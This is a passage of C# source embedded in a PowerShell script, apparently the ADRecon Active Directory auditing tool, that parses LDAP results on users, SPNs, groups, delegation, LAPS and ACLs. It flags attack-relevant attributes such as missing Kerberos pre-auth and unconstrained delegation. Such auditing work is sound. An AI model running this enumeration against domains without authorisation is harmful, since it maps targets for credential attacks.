                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
    }
}
"@

$LDAPSource = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

namespace ADRecon
{
    public static class LDAPClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<String, String> AdGroupDictionary = new Dictionary<String, String>();
        private static String DomainSID;
        private static Dictionary<String, String> AdGPODictionary = new Dictionary<String, String>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<String, String> AdSIDDictionary = new Dictionary<String, String>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new String[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new String[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new String[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new String[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum GroupTypeFlags
        {
            GLOBAL_GROUP       = 2,            // 0x00000002
            DOMAIN_LOCAL_GROUP = 4,            // 0x00000004
            LOCAL_GROUP        = 4,            // 0x00000004
            UNIVERSAL_GROUP    = 8,            // 0x00000008
            SECURITY_ENABLED   = -2147483648   // 0x80000000
        }

		private static readonly Dictionary<String, String> Replacements = new Dictionary<String, String>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static String CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            String CleanedString = String.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (String Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static bool LAPSCheck(Object[] AdComputers)
        {
            bool LAPS = false;
            foreach (SearchResult AdComputer in AdComputers)
            {
                if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count == 1)
                {
                    LAPS = true;
                    return LAPS;
                }
            }
            return LAPS;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, String DomainSID, int numOfThreads)
        {
            LDAPClass.AdGroupDictionary = new Dictionary<String, String>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            LDAPClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            LDAPClass.AdGPODictionary = new Dictionary<String, String>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.AdSIDDictionary = new Dictionary<String, String>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(String name)
        {
            switch (name)
            {
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    bool? Enabled = null;
                    bool? CannotChangePassword = null;
                    bool? PasswordNeverExpires = null;
                    bool? AccountLockedOut = null;
                    bool? PasswordExpired = null;
                    bool? ReversiblePasswordEncryption = null;
                    bool? DelegationPermitted = null;
                    bool? SmartcardRequired = null;
                    bool? UseDESKeyOnly = null;
                    bool? PasswordNotRequired = null;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    bool? DoesNotRequirePreAuth = null;
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    String DelegationType = null;
                    String DelegationProtocol = null;
                    String DelegationServices = null;
                    bool MustChangePasswordatLogon = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    bool Dormant = false;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    byte[] ntSecurityDescriptor = null;
                    bool DenyEveryone = false;
                    bool DenySelf = false;
                    String SIDHistory = "";

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        PasswordNeverExpires = (userFlags & UACFlags.DONT_EXPIRE_PASSWD) == UACFlags.DONT_EXPIRE_PASSWD;
                        AccountLockedOut = (userFlags & UACFlags.LOCKOUT) == UACFlags.LOCKOUT;
                        DelegationPermitted = !((userFlags & UACFlags.NOT_DELEGATED) == UACFlags.NOT_DELEGATED);
                        SmartcardRequired = (userFlags & UACFlags.SMARTCARD_REQUIRED) == UACFlags.SMARTCARD_REQUIRED;
                        ReversiblePasswordEncryption = (userFlags & UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED) == UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
                        UseDESKeyOnly = (userFlags & UACFlags.USE_DES_KEY_ONLY) == UACFlags.USE_DES_KEY_ONLY;
                        PasswordNotRequired = (userFlags & UACFlags.PASSWD_NOTREQD) == UACFlags.PASSWD_NOTREQD;
                        PasswordExpired = (userFlags & UACFlags.PASSWORD_EXPIRED) == UACFlags.PASSWORD_EXPIRED;
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                        DoesNotRequirePreAuth = (userFlags & UACFlags.DONT_REQUIRE_PREAUTH) == UACFlags.DONT_REQUIRE_PREAUTH;
                    }
                    if (AdUser.Properties["msds-supportedencryptiontypes"].Count != 0)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Properties["msds-supportedencryptiontypes"][0];
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdUser.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdUser.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdUserEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdUserEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,false,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            if ((Convert.ToString(Rule.ObjectType)).Equals("ab721a53-1e2f-11d0-9819-00aa0040529b"))
                            {
                                if (Rule.AccessControlType.ToString() == "Deny")
                                {
                                    String ObjectName = Convert.ToString(Rule.IdentityReference);
                                    if (ObjectName == "Everyone")
                                    {
                                        DenyEveryone = true;
                                    }
                                    if (ObjectName == "NT AUTHORITY\\SELF")
                                    {
                                        DenySelf = true;
                                    }
                                }
                            }
                        }
                        if (DenyEveryone && DenySelf)
                        {
                            CannotChangePassword = true;
                        }
                        else
                        {
                            CannotChangePassword = false;
                        }
                    }
                    if (AdUser.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdUser.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (AdUser.Properties["pwdLastSet"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) == "0")
                        {
                            if ((bool) PasswordNeverExpires == false)
                            {
                                MustChangePasswordatLogon = true;
                            }
                        }
                        else
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdlastset"][0]));
                            DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                            if (DaysSinceLastPasswordChange > PassMaxAge)
                            {
                                PasswordNotChangedafterMaxAge = true;
                            }
                        }
                    }
                    if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 9223372036854775807)
                    {
                        if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 0)
                        {
                            try
                            {
                                //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                                AccountExpires = DateTime.FromFileTime((long)(AdUser.Properties["accountExpires"][0]));
                                AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                            }
                            catch //(Exception e)
                            {
                                //    Console.WriteLine("{0} Exception caught.", e);
                            }
                        }
                    }
                    if ((bool) TrustedforDelegation)
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdUser.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                    {
                        DelegationType = "Constrained";
                        for (int i = 0; i < AdUser.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                        {
                            var delegateto = AdUser.Properties["msDS-AllowedToDelegateTo"][i];
                            DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                        }
                        DelegationServices = DelegationServices.TrimStart(',');
                    }
                    if ((bool) TrustedtoAuthforDelegation)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    if (AdUser.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdUser.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdUser.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", (AdUser.Properties["samaccountname"].Count != 0 ? AdUser.Properties["samaccountname"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("Name", (AdUser.Properties["name"].Count != 0 ? CleanString(AdUser.Properties["name"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", CannotChangePassword));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", PasswordNeverExpires));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", ReversiblePasswordEncryption));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", SmartcardRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", DelegationPermitted));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", UseDESKeyOnly));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", DoesNotRequirePreAuth));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AccountLockedOut));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", PasswordExpired));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", PasswordNotRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", (AdUser.Properties["userworkstations"].Count != 0 ? AdUser.Properties["userworkstations"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", (AdUser.Properties["admincount"].Count != 0 ? AdUser.Properties["admincount"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", (AdUser.Properties["primarygroupid"].Count != 0 ? AdUser.Properties["primarygroupid"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdUser.Properties["objectSID"][0], 0))));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("Description", (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Title", (AdUser.Properties["Title"].Count != 0 ? CleanString(AdUser.Properties["Title"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Department", (AdUser.Properties["Department"].Count != 0 ? CleanString(AdUser.Properties["Department"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Company", (AdUser.Properties["Company"].Count != 0 ? CleanString(AdUser.Properties["Company"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Manager", (AdUser.Properties["Manager"].Count != 0 ? CleanString(AdUser.Properties["Manager"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Info", (AdUser.Properties["info"].Count != 0 ? CleanString(AdUser.Properties["info"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", (AdUser.Properties["mobile"].Count != 0 ? CleanString(AdUser.Properties["mobile"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Email", (AdUser.Properties["mail"].Count != 0 ? CleanString(AdUser.Properties["mail"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", (AdUser.Properties["homedirectory"].Count != 0 ? AdUser.Properties["homedirectory"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", (AdUser.Properties["profilepath"].Count != 0 ? AdUser.Properties["profilepath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", (AdUser.Properties["scriptpath"].Count != 0 ? AdUser.Properties["scriptpath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdUser.Properties["useraccountcontrol"].Count != 0 ? AdUser.Properties["useraccountcontrol"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("First Name", (AdUser.Properties["givenName"].Count != 0 ? CleanString(AdUser.Properties["givenName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", (AdUser.Properties["middleName"].Count != 0 ? CleanString(AdUser.Properties["middleName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", (AdUser.Properties["sn"].Count != 0 ? CleanString(AdUser.Properties["sn"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Country", (AdUser.Properties["c"].Count != 0 ? CleanString(AdUser.Properties["c"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", (AdUser.Properties["whencreated"].Count != 0 ? AdUser.Properties["whencreated"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", (AdUser.Properties["whenchanged"].Count != 0 ? AdUser.Properties["whenchanged"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", (AdUser.Properties["distinguishedname"].Count != 0 ? CleanString(AdUser.Properties["distinguishedname"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", (AdUser.Properties["canonicalname"].Count != 0 ? AdUser.Properties["canonicalname"][0] : "")));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    String Memberof = null;
                    DateTime? PasswordLastSet = null;

                    if (AdUser.Properties["pwdlastset"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) != "0")
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdLastSet"][0]));
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    String Description = (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "");
                    String PrimaryGroupID = (AdUser.Properties["primarygroupid"].Count != 0 ? Convert.ToString(AdUser.Properties["primarygroupid"][0]) : "");
                    if (AdUser.Properties["memberof"].Count != 0)
                    {
                        foreach (String Member in AdUser.Properties["memberof"])
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    foreach (String SPN in AdUser.Properties["serviceprincipalname"])
                    {
                        String[] SPNArray = SPN.Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", AdUser.Properties["name"][0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Username", AdUser.Properties["samaccountname"][0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    String ManagedByValue = AdGroup.Properties["managedby"].Count != 0 ? Convert.ToString(AdGroup.Properties["managedby"][0]) : "";
                    String ManagedBy = "";
                    String GroupCategory = null;
                    String GroupScope = null;
                    String SIDHistory = "";

                    if (AdGroup.Properties["managedBy"].Count != 0)
                    {
                        ManagedBy = (ManagedByValue.Split(',')[0]).Split('=')[1];
                    }

                    if (AdGroup.Properties["grouptype"].Count != 0)
                    {
                        var groupTypeFlags = (GroupTypeFlags) AdGroup.Properties["grouptype"][0];
                        GroupCategory = (groupTypeFlags & GroupTypeFlags.SECURITY_ENABLED) == GroupTypeFlags.SECURITY_ENABLED ? "Security" : "Distribution";

                        if ((groupTypeFlags & GroupTypeFlags.UNIVERSAL_GROUP) == GroupTypeFlags.UNIVERSAL_GROUP)
                        {
                            GroupScope = "Universal";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.GLOBAL_GROUP) == GroupTypeFlags.GLOBAL_GROUP)
                        {
                            GroupScope = "Global";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.DOMAIN_LOCAL_GROUP) == GroupTypeFlags.DOMAIN_LOCAL_GROUP)
                        {
                            GroupScope = "DomainLocal";
                        }
                    }
                    if (AdGroup.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdGroup.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdGroup.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Properties["samaccountname"][0]));
